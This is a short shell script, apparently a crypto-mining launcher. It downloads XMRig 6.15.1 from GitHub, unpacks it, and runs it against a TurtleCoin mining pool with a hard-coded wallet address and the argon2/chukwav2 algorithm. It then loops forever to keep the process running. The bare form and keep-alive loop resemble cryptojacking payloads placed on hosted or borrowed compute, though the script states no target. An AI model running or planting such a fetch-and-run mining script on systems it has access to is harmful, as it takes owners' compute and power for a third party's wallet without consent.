#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLv1eYKHbA1j2o26Nq8hQm9XbRvGG8GQ6d6zdeS26EPcDztUuAf7U1qh5xXtjDRjcassNDwFYymYtofATT6uS81EsLPHHKwCJ -p Rig1 -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
